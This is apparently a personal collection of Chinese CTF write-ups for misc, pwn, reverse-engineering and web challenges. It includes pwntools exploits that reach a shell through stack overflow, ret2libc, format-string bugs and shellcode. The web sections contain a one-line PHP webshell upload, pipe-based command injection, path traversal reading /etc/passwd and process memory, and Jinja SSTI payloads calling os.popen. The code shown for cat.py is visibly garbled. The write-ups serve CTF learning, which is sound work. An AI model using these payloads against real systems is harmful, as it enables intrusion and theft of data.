cat? cat. cat. cat. cat. cat. cat. cat. cat. cat? cat. cat? cat! cat. cat?
cat. cat. cat. cat. cat. cat. cat. cat. cat! cat. cat? cat. cat. cat. cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat! cat? cat! cat!
cat. cat? cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat!
cat! cat? cat. cat? cat! cat. cat? cat! cat! cat! cat! cat! cat! cat! cat!
cat! cat! cat! cat! cat! cat. cat? cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat. cat! cat? cat! cat! cat. cat?
cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat? cat. cat? cat! cat. cat? cat. cat. cat. cat. cat! cat. cat? cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat! cat? cat! cat! cat. cat? cat!
cat! cat! cat! cat! cat! cat! cat! cat? cat. cat? cat! cat. cat? cat! cat!
cat! cat! cat! cat! cat! cat! cat! cat. cat! cat! cat! cat! cat! cat! cat!
cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat. cat? cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat! cat? cat! cat! cat.
cat? cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat? cat. cat? cat!
cat. cat? cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat!
cat! cat! cat! cat! cat! cat! cat! cat! cat. cat? cat. cat. cat. cat. cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat! cat? cat! cat! cat.
cat? cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat.
cat? cat. cat? cat! cat. cat? cat. cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat. cat. cat. cat! cat. cat. cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat. cat. cat. cat. cat! cat. cat? cat. cat. cat. cat. cat. cat. cat.
cat. cat. cat. cat. cat! cat? cat! cat! cat. cat? cat! cat! cat! cat! cat!
cat! cat! cat! cat! cat! cat? cat. cat? cat! cat. cat? cat! cat! cat! cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat! cat. cat? cat. cat. cat. cat.
cat. cat. cat. cat. cat. cat! cat? cat! cat! cat. cat? cat. cat. cat. cat.
cat. cat. cat. cat. cat? cat. cat? cat! cat. cat? cat. cat. cat. cat. cat!
cat. cat! cat! cat! cat. cat? cat. cat. cat. cat. cat. cat. cat. cat! cat?
cat! cat! cat. cat? cat! cat! cat! cat! cat! cat! cat? cat. cat? cat! cat.
cat? cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat.
cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat. cat.
cat. cat. cat. cat. cat. cat. cat. cat! cat. cat! cat! cat! cat! cat! cat.
cat? cat. cat. cat. cat. cat. cat. cat. cat. cat. cat! cat? cat! cat! cat.
cat? cat. cat. cat. cat. cat. cat. cat. cat. cat? cat. cat? cat! cat. cat?
cat. cat. cat. cat. cat. cat. cat! cat. cat? cat. cat. cat. cat. cat. cat.
cat. cat. cat. cat! cat? cat! cat! cat. cat? cat! cat! cat! cat! cat! cat!
cat! cat! cat? cat. cat? cat! cat. cat? cat! cat! cat! cat. cat! cat! cat!
cat! cat! cat. cat? cat. cat. cat. cat. cat. cat. cat. cat. cat. cat! cat?
cat! cat! cat. cat? cat. cat. cat. cat. cat. cat. cat. cat. cat? cat. cat?
cat! cat. cat? cat. cat. cat. cat. cat. cat. cat! cat. cat? cat. cat. cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat! cat? cat! cat! cat. cat? cat! cat! cat! cat! cat! cat! cat! cat!
cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat? cat. cat? cat! cat.
cat? cat! cat! cat! cat! cat! cat. cat! cat. cat! cat. cat? cat. cat. cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat! cat? cat! cat! cat. cat? cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat? cat. cat? cat! cat.
cat? cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat! cat. cat? cat. 

用0ok语言解码后即可得到：

CATCTF{Th1s_V3ry_cute_catcat!!!}

```python
import matplotlib.pyplot as plt
from matplotlib.ticker import MultipleLocator

# 打开文件并读取数据
with open('C:/Users/86186/Desktop/c280d387-a16e-427b-a53f-ed5c9636420b/CatchCat.txt', 'r') as file:
    lines = file.readlines()

# 提取纬度和经度
latitudes = []
longitudes = []

for line in lines:
    if line.startswith('$GPGGA'):
        parts = line.split(',')
        lat = float(parts[2]) if parts[3] == 'N' else -float(parts[2])
        lon = float(parts[4]) if parts[5] == 'E' else -float(parts[4])
        latitudes.append(lat)
        longitudes.append(lon)

# 绘制散点图
plt.figure(figsize=(6, 10))  # 宽度为6英寸，高度为8英寸
plt.scatter(longitudes, latitudes)

x_major_locator = MultipleLocator(0.004)
# 把x轴的刻度间隔设置为0.1
y_major_locator = MultipleLocator(1)
# 把y轴的刻度间隔设置为0.05

ax = plt.gca()
# ax为两条坐标轴的实例
ax.xaxis.set_major_locator(x_major_locator)
# 把x轴的主刻度设置为0.1的倍数
ax.yaxis.set_major_locator(y_major_locator)
# 把y轴的主刻度设置为0.05的倍数

plt.xlim(10856.5, 10857)
# 把x轴的刻度范围设置为0到1
plt.ylim(3415.9, 3416.55)
# 把y轴的刻度范围设置为0到0.7

plt.show()
```

对于画图有了新的理解

ext3是Linux的一种硬盘格式，是一个[日志文件系统](https://zh.wikipedia.org/wiki/日志文件系统)，常用于[Linux操作系统](https://zh.wikipedia.org/wiki/Linux操作系统)。它是很多[Linux发行版](https://zh.wikipedia.org/wiki/Linux发行版)的默认[文件系统](https://zh.wikipedia.org/wiki/文件系统)。[史提芬·崔迪](https://zh.wikipedia.org/wiki/史提芬·崔迪)在1999年2月的内核邮件列表[[2\]](https://zh.wikipedia.org/zh-hans/Ext3#cite_note-2)中，最早显示了他使用扩展的[ext2](https://zh.wikipedia.org/wiki/Ext2)，该文件系统从2.4.15版本的内核开始，合并到内核主线中[[3\]](https://zh.wikipedia.org/zh-hans/Ext3#cite_note-3)。

ext3文件相当于Linux的一块磁盘，可以挂载

然后用mount挂载在一个文件夹上，即可打开文件夹获取内容

然后find -n 'flag*'即可获取flag.txt的地址，即可用base64解码获得flag

将图片转化为二进制  白代表0 黑代表1

面向chatgpt编程

```python
from PIL import Image
import os
flag = ''
# 文件夹路径
folder_path = "C://Users//86186//Desktop//ctf//misc//dbbc971bf4da461fb8939ed8fc9c4c9d//gif"

# 自定义排序函数
def get_numeric_part(filename):
    # 提取文件名中的数字部分
    numeric_part = ''.join(filter(str.isdigit, filename))
    return int(numeric_part) if numeric_part else -1

# 遍历文件夹中的图片，并按数字顺序排序
for filename in sorted(os.listdir(folder_path), key=get_numeric_part):
    if filename.endswith(".jpg") or filename.endswith(".png") or filename.endswith(".jpeg"):
        # 图片路径
        image_path = os.path.join(folder_path, filename)

        # 打开图片
        image = Image.open(image_path)

        # 获取图片的RGB值
        rgb_values = image.getpixel((0, 0))  # 这里获取左上角像素的RGB值，可以根据需要修改
        if rgb_values[2] == 255:
            flag += '0'
        else:
            flag += '1'
binary_string = flag
# 将二进制字符串分割成8位一组
binary_list = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]

# 将每个8位二进制字符串转换为整数，并再转换为对应的ASCII字符
ascii_string = ''.join(chr(int(binary, 2)) for binary in binary_list)

print(ascii_string)
```

是一个RAR文件，用WinRAR文件解压的时候显示secret.png解压头格式错误

然后查找相关文献

![image-20230927112920293](./assets/image-20230927112920293.png)

后面应该是一个文件块74而不是一个字块，手动修改为74然后解压，用ps分层加stegsolve解密即可获得二维码

打开pdf，然后复制到记事本上，然后发现一串AB。

把A换成'-' B换成'.'得到：

-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...--

摩斯密码解密可得flag。注意：有空格做分隔符的可能是摩斯密码

这里说培根密码是5个字符一个字母

先用stegpy提取隐写内容获得如下

```python
eyjd{4e71wf_H1uc3s_15_EEEEpwwl!!}

a,b∈(1,25]
a=x**2;
b=(x-2)**2;
print(a,b)
```

然后利用仿射密码即可求解

现在misc的题脑洞真大

感觉这些题出的

一直base64然后最后用base92

我的评价是：万能的binwalk命令

复制到kali里面用binwalk分离

binwalk是一种用于分析和提取嵌入式设备、固件和其他二进制文件的工具。在给定的命令中，binwalk命令被用来对名为vm-106-disk-1.qcow2的文件进行分析和提取。

选项-e代表"提取"，它告诉binwalk在分析文件时尝试提取嵌入其中的文件和数据。

然后就可获得flag

### qcow2文件

qcow2是qemu虚拟机中特别常用的镜像文件格式，QCOW即Qemu Copy-On-Write写时拷贝，从字面上理解，qcow/qcow2的文件组织形式应该是建立在Copy-On-Write这个基本的机制上，即当某个数据块被引用多次时，若某个实例尝试写该数据块，为了不让其他实例看到该数据块的变化，就会将该数据块拷贝一份，然后将修改生效到拷贝的数据块上。

用wireshark打开流量包分析

发现大概是一个hacker用菜刀连接获取权限

追踪http数据流可以发现其上传图片6666.jpg的数据

用hex复制其数据到010editor里面，然后以JPG保存即可获得图片，FFD8FF 到 FFD9 是 JPEG 图像文件的起始和结束标记。

即可获取图片内容

![image-20231009170038246](./assets/image-20231009170038246.png)

然后再用binwalk分析数据包

![image-20231009170129845](./assets/image-20231009170129845.png)

发现一个zip文件

这里用foremost分离即可获得压缩包，然后输入密码获取flag

直接反编译（不会有人真的做到了60S吧）

然后发现flag：后面base64解密后即可

flag{DajiDali_JinwanChiji}

先给了一段奇怪的话：后来发现是与佛论禅加密

解密后得到MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9

再用ROT13解密得到：ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9

base64解密后得到最终解：flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}

不得不佩服misc题目的脑洞：这题先给一串加密后的密文：

c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2

你会发现只有数字和a,b,c,d,e,f 然后把两两转为十六进制减去128（可视字符）

即可获得flag

自己写misc题目的耐心真差

用wireshark打开（不会用wireshark啦:sob:）

然后追踪http数据流就行了

获取flag

先checksec一下然后发现

Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled

这里启用了canary(栈保护)

用IDA64打开，然后反编译得到基本逻辑：首先从输入gets一个姓名，然后用种子初始化随机数发生器，対生成的随机数进行处理，然后再输入下一个整数，将随机数处理后的值与输入数值进行比较，如果10轮比较都相同则成功，随机调用sub_CE(),获得flag

查找V7的栈，发现

![img](./assets/1931211-20201006012355208-2012738685.png)

因此，只要栈溢出，将我们指定的值覆盖到seed的部分，然后借助ctypes调佣linux中c标准动态库libc.so.6,就可以破解伪随机数了

可以用ldd查看标准库

具体payload如下：

```python
from pwn import *
from ctypes import *
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
payload = b'a'*32 + p64(1)
p = remote("61.147.171.105", 51327)
libc.srand(1)
p.sendlineafter('name',payload)
for i in range(10):
    p.sendlineafter('number',str(libc.rand()%6 + 1))
p.interactive()

```



用checksec分析发现

发现只启用了 NX(No eXecute，数据不可执行)保护机制，因此可以拿来 做栈溢出攻击。（NX 保护开启意味着栈中数据没有执行权限，以前的经 常用的 call esp 或者 jmp esp 的方法就不能使用，但是可以利用 rop 这种 方法绕过）

反编译然后发现需要用

脚本编写如下

```python
from pwn import *
p = remote("61.147.171.105","64370")
cat_flag_addr = 0x0804868B
p.recvuntil('choice:')
p.sendline('1')
p.recvuntil('name:')
p.sendline('pwn')
p.recvuntil('passwd:')
payload = b'a' * 0x14 + b'A'*4 + p32(cat_flag_addr) + (259 - 20 -4 -4) * b'a'
p.sendline(payload)
p.interactive()

```

这里的payload解释如下：

先利用255+4溢出得到4

然后用b'a' * 0x14填充dest,用b'A' * 4 覆盖caller(**这里挺好奇为什么不可以用p32(0)的，后面交流后发现ebp要指向一个貌似合理的地址，p32(0)和p32(1)不行，但是p32(cat_flag_addr)是可以的**)，然后用cat_flag_addr的地址覆盖返回地址，即可获得flag

先附上exp:

```python
from pwn import *
context.log_level = "debug"
p = remote('61.147.171.105','54780')
libc = ELF('libc_32.so.6')
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b"/bin/sh"))
elf = ELF('level3')
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']

payload = b'A' * (0x88 + 4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
p.sendlineafter("Input:\n", payload)
write_addr = u32(p.recv()[0:4])
write_offset = libc.symbols['write']
libc_addr = write_addr - write_offset
system_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset
payload = b"A"*(0x88+4) + p32(system_addr) + b"A"*4 + p32(binsh_addr)
p.sendline(payload)

p.interactive()
```

背景介绍（全靠chatgpt）

`libc_32.so.6` 是一个 Linux 系统下的动态链接库文件，通常被称为 C 库或 libc。

在 Linux 系统中，`libc` 是一个非常重要的库，提供了许多与系统函数和标准 C 函数相关的功能和符号。它包含了大量的函数和符号，用于处理字符串、内存分配、文件 I/O、进程管理、网络通信等等。这些函数和符号是在编译和链接程序时使用的。

`libc_32.so.6` 是针对 32 位的 Linux 系统的 C 库文件。它的命名约定是 `libc_32.so.X`，其中 `X` 是一个特定的版本号，用于区分不同的 libc 版本。这个库文件通常位于系统的共享库目录中，例如 `/lib` 或 `/usr/lib`。

就是相当于把一个库打包过来了，然后调用的时候会从里面找相应的函数进行调用

反编译源码如下

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
 
ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]
 
  write(1, "Input:\n", 7u);
  return read(0, &buf, 0x100u);
}
```

这里的read是溢出点

先找出libc文件中的system和/bin/sh的偏移地址

```python
libc = ELF("libc_32.so.6")
 
system_offset = libc.symbols['system']
binsh_offset = libc.search('/bin/sh').next()
```

这里libc的so文件是作为动态库载入的，所以在偏移地址的基础上，还需要找到库的基地址，这里我们用write函数获取基地址

```python
elf = ELF("level3")
 
write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.symbols["main"]
 
payload = "A"*(0x88+4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
```

获取了write函数的PLT地址和GOT地址还有main地址

这里构造语句

```c
write(1, write_got, 4)
```

即可获得wirte_got的地址，即可算出来libc库的基地址

```c
write_addr = u32(cmd_remote.recv()[0:4])
write_offset = libc.symbols["write"]
libc_addr = write_addr - write_offset
system_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset
```

然后即可用ROP获取flag

屠龙少年终成恶龙（这样看pwn还是挺有意思的）只是我不配罢了

先分析一下大概逻辑

先放wp

```python
from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
p = remote('61.147.171.105','65497')
p.recvuntil('secret[0] is ')
addr = int(p.recvuntil('\n'),16)
payload = '%85d%7$n'
p.sendlineafter('be:\n','aaa')
p.sendlineafter('up?:\n','east')
p.sendlineafter('leave(0)?:\n', '1')
p.sendlineafter("address'\n", str(addr))
p.sendlineafter('is:\n',payload)
sc = asm(shellcraft.sh())
p.sendlineafter('SPELL', sc)
p.interactive()

```

用IDA分析

main函数如下

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _DWORD *v4; // [rsp+18h] [rbp-78h]

  setbuf(stdout, 0LL);
  alarm(0x3Cu);
  sub_400996(0x3CLL);
  v4 = malloc(8uLL);
  *v4 = 68;
  v4[1] = 85;
  puts("we are wizard, we will give you hand, you can not defeat dragon by yourself ...");
  puts("we will tell you two secret ...");
  printf("secret[0] is %x\n", v4);
  printf("secret[1] is %x\n", v4 + 1);
  puts("do not tell anyone ");
  sub_400D72((__int64)v4);
  puts("The End.....Really?");
  return 0LL;
}
```

动态分给v4地址，然后将68存给v4地址对应的值，将85存给v4地址+1的位置上。这里获取一下secret[0]也就是v4的地址，然后再输出do not tell anyone后进入sub_400D72

```c
unsigned __int64 __fastcall sub_400D72(__int64 a1)
{
  char s[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("What should your character's name be:");
  _isoc99_scanf("%s", s);
  if ( strlen(s) <= 0xC )
  {
    puts("Creating a new player.");
    sub_400A7D();
    sub_400BB9();
    sub_400CA6((_DWORD *)a1);
  }
  else
  {
    puts("Hei! What's up!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

这个函数就是让你输入你的name，然后进入sub_400A7D()、 sub_400BB9()、sub_400CA6((_DWORD *)a1);

第一个函数没啥漏洞

第二个函数如下

```c
if ( v1 == 1 )
  {
    puts("A voice heard in your mind");
    puts("'Give me an address'");
    _isoc99_scanf("%ld", &v2);
    puts("And, you wish is:");
    _isoc99_scanf("%s", format);
    puts("Your wish is");
    printf(format);
    puts("I hear it, I hear it....");
  }
```

这里的话v2和format离的比较近，就可以用v2传地址，然后用format和printf字符串格式化漏洞传递

payload = '%85d%7$n'大概就是这样用字符串格式化漏洞

然后终于可以进来了！

```c
  if ( *a1 == a1[1] )
  {
    puts("Wizard: I will help you! USE YOU SPELL");
    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
    read(0, v1, 0x100uLL);
    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);
  }
```

这里的话要写入一个shellcode

```python
sc = asm(shellcraft.sh())
p.sendlineafter('SPELL', sc)
```

然后即可获取权限

SMC（Software-Based Memory Encryption）是一种局部代码加密技术，它可以将一个可执行文件的指定区段进行加密，使得黑客无法直接分析区段内的代码，从而增加恶意代码分析难度

SMC的基本原理是在编译可执行文件时，将需要加密的代码区段（例如函数、代码块等）单独编译成一个section（段），并将其标记为可读、可写、不可运行，然后通过某种方式在程序运行时将这个section解密为可执行代码，并将其标记为可读、可执行、不可写

SMC的主要步骤包括：

1.读取PE文件并找到需要加密的代码段

2.将代码段的内容进行异或加密，并更新到内存中的代码段

3.重定向代码段的内存地址，使得加密后的代码能够正确执行

4.执行加密后的代码段

具体加密执行方式：

```c
void fun()
{
    char flag[]="flag{this_is_test}"
     printf("%s",flag)
}
int main()
{
    byte *a=(byte *)fun;
    byte *b = a;
     for( ; a!=(b+0x401451-0x401410+1) ; a++ )
    {
        *a=*a^3;
    }
    fun();
        
}
```

这题的题解如下：

在ida中运行这个python脚本：

```python
s=0x600B00
for i in range(182):
    patch_byte(s+i,get_wide_byte(s+i)^0xC)
```

然后对judge函数进行操作，先用c生成新汇编，然后按p生成新的judge函数，再按F5反汇编即可

得到新的judge函数：

```c
qmemcpy(v2, "fmcd", 4);
v2[4] = 127;
qmemcpy(v3, "k7d;V`;np", sizeof(v3));
for ( i = 0; i <= 13; ++i )
*(_BYTE *)(i + a1) ^= i;
for ( i = 0; i <= 13; ++i )
{
if ( *(_BYTE *)(i + a1) != v2[i] )
return 0LL;
}
return 1LL;
```

编写脚本求解：

```python
# 使用新的字符串变量来保存解密后的结果
decode_flag = "fmcd\x7Fk7d;V`;np"
decoded_flag = ""
for i in range(14):
    decoded_flag += chr(ord(decode_flag[i]) ^ i)
print(decoded_flag)
```



先下载附件解压缩发现里面有三个文件（两个linux和一个windows上的）

用windows的IDA分析exe

main函数大概如下：

```c
  v27 = 0x65;
  v26 = 0x32;
  v25 = 0x2D;
  v24 = 0xE3;
  v23 = 0xD3;
  v22 = 0x43;
  v21 = 0x92;
  v20 = 0xA9;
  v19 = 0x9D;
  v18 = 0xD2;
  v17 = 0xE6;
  v16 = 0x6D;
  v15 = 0x2C;
  v14 = 0xD3;
  v13 = 0xB6;
  v12 = 0xBD;
  v11 = 0xFE;
  v10 = 0x6A;
  v9 = 0x13;
  v3 = alloca(0x20);
  v4 = alloca(0x20);
  v8 = &v6;
  printf("Key: ");
  scanf("%s", v8);
  if ( check_key(v8) )
    interesting_function(&v7);
  else
    puts("Wrong");
  return 0;
}
```

发现就大概输入key然后检查key，就可以去分析汇编代码了

![image-20230524201428057](./assets/image-20230524201428057.png)

可以找到跳转的指令发现是在这里判断eax的值（为0就跳转）

F2在test这一行处设置断点 然后执行在这一行，在右边修改寄存器eax的值为1即可后来发现输出乱码

![image-20230524201739588](./assets/image-20230524201739588.png)

放弃选择在linux下用gdb调试

这步骤如下

```shell
经过 IDA 的分析，在主函数打断点，因为 check_key 函数打断点会进入，所以在主函数一直单步调试
1. b main
2. r
3. n (一直单步调试到输入 Key) //可以狂按enter
4. set $eax=1 (设置判断条件为真，运行到 test eax, eax)
5. c
flag_is_you_know_cracking!!!
```





先创建一个账号

然后登进去发现在cookie：a1ca81cc20da244323498b26f4a5051a（感觉一般都是md5加密）

这里是5:cyny666

伪造一个1:admin的md5:4b9987ccafacb8d8fc08d22bbca797ba

personal那里查看个人信息的时候修改数据包uid和cookie

获取基本信息

| Birthday | 1993/01/01         |
| -------- | ------------------ |
| Address  | 福建省福州市闽侯县 |

然后可以在找密码的时候输入信息修改admin的密码

在manage模块发送包的时候加入X-Forwarded-For:127.0.0.1

然后看页面码有<!-- index.php?module=filemanage&do=???-->

然后上传文件构造一个jpg文件即可 注意绕过<?php

<script language="php">system($_GET[a]);</script>

每次遇到一个以为很简单的题（确总是很难）:sleeping:

先打开（然后以为是命令行注入漏洞）后来发现自己太年轻

这里用bp进行一下fuzz测试（真的有用！！！）黑盒测试yyds

然后发现关键的几个点

输入@和宽字符都会有异常现象

宽字符会报错

可以将报错的html文件用html格式打开

发现是一个Django的报错

结合django的报错得知了项目的绝对路径为`/opt/api`

这里还需要懂一些django开发的基本知识，我感觉这道题涉及的面有点广了，django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。

读取settings.py文件，这里需要注意django项目生成时settings.py会存放在以项目目录下再以项目名称命名的文件夹下面。

http://61.147.171.105:50031/index.php?url=@/opt/api/settings.py

http://61.147.171.105:50031/index.php?url=@/opt/api/database.sqlite3

然后可以用@读关键文件即可发现flag

这道题感觉难度只有2会不会有点低:sob:

首先在界面中点击某种猫会发现http://61.147.171.105:49839/info?file=ForestCat.txt

于是感觉有文件包含漏洞

发现可以读取http://61.147.171.105:49839/info?file=../../../../../../../etc/passwd

可通过bp抓包得知是用python中的flask框架搭建的

可以读取/proc/self/cmdline来确定http://61.147.171.105:49839/info?file=../../../../../../../proc/self/cmdline

b'python\x00app.py\x00' 可以解码

然后可以读取app.py和cat.py

app.py如下：

```python
import os
import uuid
from flask import Flask, request, session, render_template, Markup
from cat import cat

flag = ""
app = Flask(
    __name__,
    static_url_path='/',
    static_folder='static'
)
app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
if os.path.isfile("/flag"):
    flag = cat("/flag")
    os.remove("/flag")


@app.route('/', methods=['GET'])
def index():
    detailtxt = os.listdir('./details/')
    cats_list = []
    for i in detailtxt:
        cats_list.append(i[:i.index('.')])

    return render_template("index.html", cats_list=cats_list, cat=cat)


@app.route('/info', methods=["GET", 'POST'])
def info():
    filename = "./details/" + request.args.get('file', "")
    start = request.args.get('start', "0")
    end = request.args.get('end', "0")
    name = request.args.get('file', "")[:request.args.get('file', "").index('.')]

    return render_template("detail.html", catname=name, info=cat(filename, start, end))


@app.route('/admin', methods=["GET"])
def admin_can_list_root():
    if session.get('admin') == 1:
        return flag
    else:
        session['admin'] = 0
    return "NoNoNo"


if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False, port=5637)


```

然后发现secret_key是如下形式*abcdefgh

然后又可以读出cat.py

```python
import os, sys, getopt


def cat(filename, start=0, end=0) -> bytes:
    data = b''

    try:
        start = int(start)
    end = int(end)

    except:
    start = 0
    end = 0

    if filename != "" and os.access(filename, os.R_OK):
        f = open(filename, "rb")

    if start >= 0:
        f.seek(start)
    if end >= start and end != 0:
        data = f.read(end - start)

    else:
        data = f.read()

    else:
    data = f.read()

    f.close()

    else:
    data = ("File `%s` not exist or can not be read" % filename).encode()

    return data


if __name__ == '__main__':
    opts, args = getopt.getopt(sys.argv[1:], '-h-f:-s:-e:', ['help', 'file=', 'start=', 'end='])
    fileName = ""
    start = 0
    end = 0

    for opt_name, opt_value in opts:
        if opt_name == '-h' or opt_name == '--help':
            print("[*] Help")
    print("-f --file File name")
    print("-s --start Start position")
    print("-e --end End position")
    print("[*] Example of reading /etc/passwd")
    print("python3 cat.py -f /etc/passwd")
    print("python3 cat.py --file /etc/passwd")
    print("python3 cat.py -f /etc/passwd -s 1")
    print("python3 cat.py -f /etc/passwd -e 5")
    print("python3 cat.py -f /etc/passwd -s 1 -e 5")
    exit()

    elif opt_name == '-f' or opt_name == '--file':
    fileName = opt_value

    elif opt_name == '-s' or opt_name == '--start':
    start = opt_value

    elif opt_name == '-e' or opt_name == '--end':
    end = opt_value

    if fileName != "":
        print(cat(fileName, start, end))

    else:
        print("No file to read")

Process
finished
with exit code 0

```

发现里面可以确定start和end

然后可以读取文件/proc/self/maps来确定可以读取的起始位置和终止位置

然后读取mem获取flag和secret_key但是还不是很会session伪造(下次再学)

最后的解题脚本如下：

```python
import requests
import re
site = "http://61.147.171.105:49839/"
url = "info?file=../../../../../../../proc/self/mem&start=%s&end=%s"
with open('maps.txt', 'r') as f:
    maps = f.readlines()
for m in maps:
    if " rw" not in m:
        continue
    m = m.split(" ")[0]
    start,end = m.split('-')[0], m.split('-')[1]
    start,end = int(start, 16), int(end, 16)
    print(start,end)
    res = requests.get(site + url % (start,end),proxies=None).content
    with open('res/%s.txt'%str(start),'wb') as f:
        f.write(res)
    # secret: uuid*abcdefgh
    secret = re.findall(b"[a-z0-9A-Z]{32}\*abcdefgh",res)
    if secret:
        print(secret)
    # flag:CatCTF{xxxx} asdfsda{
    flag = re.findall(b"[a-zA-Z]{4}\{[a-z0-9A-Z-_]*\}",res)
    if flag:
        print(flag)

```



简单的命令行注入（一直为了查看目录下的index.php命令浪费了好长时间）

有的地方可以用cat这些指令有的不可以用（感觉不是很严谨、但是自己也是挺菜的）

可以通过|来传递命令 一直在尝试用grep匹配字符（失误的彻彻底底）

直接用以下shell命令即可找到flag：（感觉这种非常适合于签到题、简单题）

```shell
192.0.0.2 | find / -name "*flag*"
```

就会发现在home目录下有一个flag.txt 的文件！下次进入到一台全新的机器记好用find或者grep 匹配特定字符！

然后用cat指令就可以完成了（感觉这题目的一些指令在特定环境下才可以使用）很疑惑、也很难绷

```shell
ping -c 3 192.0.0.2 |  cat /home/flag.txt
cyberpeace{c6dfd3694661903f0a4b366f4d714625}
```



404界面里面还可以藏东西（第一次见）

打开view-source:http://61.147.171.105:50385/register.php

然后发现是

```html

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /register.php was not found on this server.</p>
<hr>
<address>Apache/2.4.10 (Debian) Server at 61.147.171.105 Port 50385</address>
</body></html>
<!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt-->
<!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt-->
	
```

这里暴露了flag的位置（也算是一个hint）

然后就是ssti的那一套（最常用的被禁用了）

payload：

```php
http://61.147.171.105:50385/login.php/{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
```

即可获取flag

这里的构造

request有两种形式，`request.args`和`request.values`，当args被过滤时我们可以使用values，且这种方法POST和GET传递的数据都可以被接收，相对于通过`chr()`进行绕过，这种方法更为简单和便捷。

```
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

构造后为

```
{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request
```



感觉主要是对于php一些常见函数的绕过

主要区分的是==和===

==会发生强制类型转换，而===要求比较类型和值

源代码如下：

```php
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;

$a = $_GET['a'];
$b = $_GET['b'];

if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){
    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
        $key1 = 1;
        }else{
            die("Emmm...再想想");
        }
    }else{
    die("Emmm...");
}

$c=(array)json_decode(@$_GET['c']);
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
        $d = array_search("DGGJ", $c["n"]);
        $d === false?die("no..."):NULL;
        foreach($c["n"] as $key=>$val){
